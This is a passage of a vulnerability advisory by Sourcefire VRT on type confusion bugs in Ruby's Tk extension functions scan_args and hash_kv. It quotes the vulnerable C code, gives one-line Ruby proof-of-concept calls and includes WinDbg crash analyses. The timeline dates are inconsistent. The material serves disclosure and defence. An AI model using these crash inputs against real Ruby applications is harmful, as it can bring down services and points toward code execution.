DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  22446689

READ_ADDRESS:  22446689 

FOLLOWUP_IP: 
tkutil+24ef
6f3824ef 8b10            mov     edx,dword ptr [eax]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 640bec10 to 6f3824ef

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f968 640bec10 0283bd08 22446689 02c863e0 tkutil+0x24ef
0028f9e8 640cabd1 004e9c18 0066ffd0 027a3f18 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 004e9c18 0066ffd0 027a3f18 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 0258f270 640da9e0 00516250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 004e1c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 0258f270 004e4728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 004e4728 004e1ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 60223cfa 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  tkutil+24ef

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: tkutil

IMAGE_NAME:  tkutil.so

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34d4

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_tkutil.so!Unknown

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_tkutil+24ef

Followup: MachineOwner
---------

0:000> r
eax=22446689 ebx=004e9c18 ecx=0283bd08 edx=6f3824e0 esi=02c863e0 edi=00000002
eip=6f3824ef esp=0028f910 ebp=0028f968 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
tkutil+0x24ef:
6f3824ef 8b10            mov     edx,dword ptr [eax]  ds:002b:22446689=????????
------------------------------------------ code ----------------------------------------------



:: 3.2 val_ary PoC
------------------------ PoC -------------------------------
require 'tk'

TkUtil::CallbackSubst.scan_args("something",0x11223344) 
------------------------ PoC -------------------------------

:: Crash analysis 
------------------------------------------ code ----------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Module load completed but symbols could not be loaded for image00400000
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
tkutil+24fa
6f3824fa 8b3e            mov     edi,dword ptr [esi]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6f3824fa (tkutil+0x000024fa)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 22446689
Attempt to read from address 22446689

FAULTING_THREAD:  00001818

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  22446689

READ_ADDRESS:  22446689 

FOLLOWUP_IP: 
tkutil+24fa
6f3824fa 8b3e            mov     edi,dword ptr [esi]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 640bec10 to 6f3824fa

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f968 640bec10 02dcca98 02e2ac08 22446689 tkutil+0x24fa
0028f9e8 640cabd1 003f9c18 003cffd0 028e6a08 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 003f9c18 003cffd0 028e6a08 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 0043f368 640da9e0 00736250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 003f1c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 0043f368 003f4728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 003f4728 003f1ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 60208e0b 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  tkutil+24fa

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: tkutil

IMAGE_NAME:  tkutil.so

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34d4

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_tkutil.so!Unknown

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_tkutil+24fa

Followup: MachineOwner
---------

0:000> r
eax=02e2ac08 ebx=003f9c18 ecx=02dcca98 edx=00524005 esi=22446689 edi=00000002
eip=6f3824fa esp=0028f910 ebp=0028f968 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
tkutil+0x24fa:
6f3824fa 8b3e            mov     edi,dword ptr [esi]  ds:002b:22446689=????????
------------------------------------------ code ----------------------------------------------



:: 4#Details - TkUtil hash_kv		- Type Confusion

Vulnerable code:
------------------------------------------ code ----------------------------------------------
Line 758	static VALUE
Line 759	tk_hash_kv(argc, argv, self)
Line 760	int   argc;
Line 761	VALUE *argv;
Line 762	VALUE self;
Line 763	{
Line 764		volatile VALUE hash, enc_flag, ary;
Line 765
Line 766		ary = Qnil;
Line 767		enc_flag = Qnil;
Line 768		switch(argc) {
Line 769		case 3:
Line 770			ary = argv[2];
Line 771		case 2:
Line 772			enc_flag = argv[1];
Line 773		case 1:
Line 774			hash = argv[0];
Line 775			break;
Line 776		case 0:
Line 777			rb_raise(rb_eArgError, "too few arguments");
Line 778		default: /* >= 3 */
Line 779			rb_raise(rb_eArgError, "too many arguments");
Line 780		}
Line 781
Line 782		switch(TYPE(hash)) {
Line 783		case T_ARRAY:
Line 784			if (RTEST(enc_flag)) {
Line 785				return assoc2kv_enc(hash, ary, self);
Line 786			} else {
Line 787				return assoc2kv(hash, ary, self);
Line 788			}
Line 789
Line 790		case T_HASH:
Line 791			if (RTEST(enc_flag)) {
Line 792				return hash2kv_enc(hash, ary, self);
Line 793			} else {
Line 794				return hash2kv(hash, ary, self);
Line 795			}

(....)
Line 608	static VALUE
Line 609	assoc2kv_enc(assoc, ary, self)
Line 610	VALUE assoc;
Line 611	VALUE ary;
Line 612	VALUE self;
Line 613	{
(...)
Line 649		if (NIL_P(ary)) {
Line 650			return dst;
Line 651		} else {
Line 652			return rb_ary_plus(ary, dst);
Line 653		}
Line 654	}
------------------------------------------ code ----------------------------------------------

tk_hash_kv method takes 3 arguments. Last one is "ary" ( line 770) and as we can see it's type is not check before passing this variable to
assoc2kv_enc,assoc2kv,hash2kv_enc, methods. Let we check first of this methods: assoc2kv_enc and what happens later with "ary" variable.
As we could assume, "ary" variable is treated as Array but still no check for its type has been made before is usaged ( line 652).
Similar situation appears in all of mentioned methods.
Attacker passing different type of object than Array can try to lead to arbitrary code execution in some circumstance using type confusion vulnerability.


------------------ PoC -------------------
require 'tk'

TkUtil::hash_kv([],1,0x11223344)
------------------ PoC -------------------


:: Crash analysis 
------------------------------------------ code ----------------------------------------------
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** ERROR: Module load completed but symbols could not be loaded for image00400000
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Ruby22\bin\tcl85.dll - 

FAULTING_IP: 
msvcrt_ruby220!rb_ary_plus+31
63f442e1 8b07            mov     eax,dword ptr [edi]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 63f442e1 (msvcrt_ruby220!rb_ary_plus+0x00000031)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 22446689
Attempt to read from address 22446689

FAULTING_THREAD:  000019d4

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  22446689

READ_ADDRESS:  22446689 

FOLLOWUP_IP: 
msvcrt_ruby220!rb_ary_plus+31
63f442e1 8b07            mov     eax,dword ptr [edi]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  image00400000

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 6f385acd to 63f442e1

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0028f8e8 6f385acd 22446689 02d86430 0028f928 msvcrt_ruby220!rb_ary_plus+0x31
0028f968 640bec10 00000003 00350034 02d20010 tkutil+0x5acd
0028f9e8 640cabd1 00579c18 003cffd0 02866708 msvcrt_ruby220!rb_error_arity+0x1d0
0028fa98 640c3ca6 00579c18 003cffd0 02866708 msvcrt_ruby220!rb_f_send+0x671
0028fb88 640c71f7 fffffffe 00000000 77c13d1e msvcrt_ruby220!rb_vm_localjump_error+0x1c66
0028fd68 640d07e1 00000001 00000000 0028fd98 msvcrt_ruby220!rb_vm_localjump_error+0x51b7
0028fdc8 63f8ba32 0230f5b0 640da9e0 008b6250 msvcrt_ruby220!rb_iseq_eval_main+0x121
0028fe68 63f8ef4d 0028fe8c 00571c40 0028fe98 msvcrt_ruby220!rb_check_copyable+0x3122
0028fe98 0040287f 0230f5b0 00574728 0028ff88 msvcrt_ruby220!ruby_run_node+0x2d
0028fec8 004013fa 00000002 00574728 00571ec0 image00400000+0x287f
0028ff88 75e2337a 7efde000 0028ffd4 77c192e2 image00400000+0x13fa
0028ff94 77c192e2 7efde000 602f56e9 00000000 kernel32!BaseThreadInitThunk+0xe
0028ffd4 77c192b5 004014e0 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0028ffec 00000000 004014e0 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  msvcrt_ruby220!rb_ary_plus+31

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: msvcrt_ruby220

IMAGE_NAME:  msvcrt-ruby220.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  552f34ec

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_msvcrt-ruby220.dll!rb_ary_plus

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_msvcrt_ruby220!rb_ary_plus+31

WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/image00400000/2_2_2_95/552f34ec/msvcrt-ruby220_dll/2_2_2_95/552f34ec/c0000005/000042e1.htm?Retriage=1

Followup: MachineOwner
---------

0:000> r
eax=02d86430 ebx=02d86448 ecx=22446689 edx=00002027 esi=02d86430 edi=22446689
eip=63f442e1 esp=0028f8b0 ebp=0028f8e8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
msvcrt_ruby220!rb_ary_plus+0x31:
63f442e1 8b07            mov     eax,dword ptr [edi]  ds:002b:22446689=????????
------------------------------------------ code ----------------------------------------------

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-06-18 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure	